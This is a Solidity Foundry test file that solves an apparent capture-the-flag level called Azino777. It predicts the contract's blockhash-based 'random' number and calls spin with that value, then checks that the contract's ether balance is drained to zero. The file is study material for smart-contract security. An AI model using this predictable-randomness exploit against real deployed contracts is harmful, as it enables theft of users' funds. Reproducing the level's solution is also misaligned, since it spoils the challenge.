// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/01_Azino777/Azino777.sol";

// forge test --match-contract Azino777Test -vvvv
contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);
    }

    function testExploitLevel() public {
        uint256 max = 100;
        uint256 max_factor = type(uint256).max / max;
        uint256 lastNumber = block.number -1;
        uint256 hashVal = uint256(blockhash(lastNumber));
        uint256 result = (hashVal / max_factor) % max;

        instance.spin{value: 0.1 ether}(result);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
